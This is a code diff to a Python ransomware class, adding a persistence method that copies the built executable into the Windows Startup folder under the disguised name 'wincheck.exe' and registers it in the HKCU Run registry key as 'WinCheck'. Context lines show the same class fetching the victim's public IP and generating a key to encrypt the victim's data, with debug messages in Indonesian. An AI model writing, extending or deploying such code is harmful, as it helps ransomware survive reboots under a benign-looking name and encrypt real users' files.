@@ -258,6 +258,33 @@ class RansomWare:
         self.publicIP = requests.get("https://api.ipify.org").text
 
     # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
+    def _add_startup_persistence(self):
+        import shutil
+        import sys
+        import os
+        import winreg
+
+        try:
+            print("[DEBUG] Menambahkan persistence ke startup...")
+
+            startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+            exe_path = sys.executable  # Path ke file .exe saat sudah dibuild
+
+            # 1. Copy ke Startup Folder
+            target_path = os.path.join(startup_dir, "wincheck.exe")
+            if not os.path.exists(target_path):
+                shutil.copy2(exe_path, target_path)
+                print("[✓] Disalin ke folder Startup:", target_path)
+
+            # 2. Tambah ke Registry HKCU\Run
+            reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, "WinCheck", 0, winreg.REG_SZ, target_path)
+                print("[✓] Ditambahkan ke registry autorun.")
+
+        except Exception as e:
+            print("[✗] Gagal tambah persistence:", e)
+
     def generate_key(self):
         # Generates a url safe(base64 encoded) key
         self.key = Fernet.generate_key()
@@ -712,4 +739,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
